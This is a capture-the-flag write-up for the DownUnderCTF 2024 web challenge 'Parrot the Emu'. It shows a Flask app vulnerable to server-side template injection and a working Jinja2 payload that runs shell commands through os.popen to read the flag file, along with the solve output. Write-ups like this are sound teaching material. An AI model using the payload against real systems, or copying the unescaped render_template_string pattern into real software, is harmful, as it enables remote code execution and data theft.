# Parrot the Emu

- **Event:** DownUnderCTF 2024
- **Category:** web
- **Difficulty:** beginner
- **Author:** richighimi

## Summary

"It is so nice to hear Parrot the Emu talk back." A tiny Flask chat page: you type something and the "Emu" parrots it back. The vulnerability is Server-Side Template Injection (SSTI): user input is passed directly to Jinja2's `render_template_string`.

The vulnerable code in the app:

```python
from flask import Flask, render_template, request, render_template_string

@app.route('/', methods=['GET', 'POST'])
def vulnerable():
    chat_log = []
    if request.method == 'POST':
        user_input = request.form.get('user_input')
        try:
            result = render_template_string(user_input)
        except Exception as e:
            result = str(e)
        chat_log.append(('User', user_input))
        chat_log.append(('Emu', result))
    return render_template('index.html', chat_log=chat_log)
```

There is no escaping or allowlist: anything inside `{{ ... }}` in the form field `user_input` is evaluated as a Jinja2 template on the server. The deployment copies the app into `/usr/src/app` and runs Flask on port 1337, so the flag file sits in the app's working directory as `./flag`.

## Solve

1. Confirm the injection: POST `user_input = {{ 7*7 }}`. The Emu reply contains `49`, proving template evaluation rather than a plain echo.
2. Reach the `os` module through a Jinja2 builtin object. `cycler` is a Jinja2 template global whose `__init__.__globals__` contains `os`:

   ```
   {{ cycler.__init__.__globals__.os.popen('cat flag').read() }}
   ```

   (`joiner` and `namespace` work as equivalent starting points.)
3. Run the app locally exactly as deployed and exploit it over HTTP. The lab had no Flask/Jinja2 preinstalled, so the pinned versions from the challenge's `requirements.txt` (Flask 2.1.1, Werkzeug 2.0.3, Jinja2 3.1.2) were fetched as wheels from PyPI and unpacked onto `PYTHONPATH`. No app code was changed. The server was started the same way the deployment runs it:

   ```
   FLASK_APP=app.py flask run --host=127.0.0.1 --port=1337
   ```

4. Send the exploit as a form POST to `/` with the payload above as `user_input`. The Emu message in the response contains the flag.

Observed output of the solve script:

```
SSTI 7*7 check contains 49: True
Trying payload: {{ cycler.__init__.__globals__.os.popen('cat flag').read() }}
FLAG_FROM_SSTI: DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}
```

## Flag

```
DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}
```
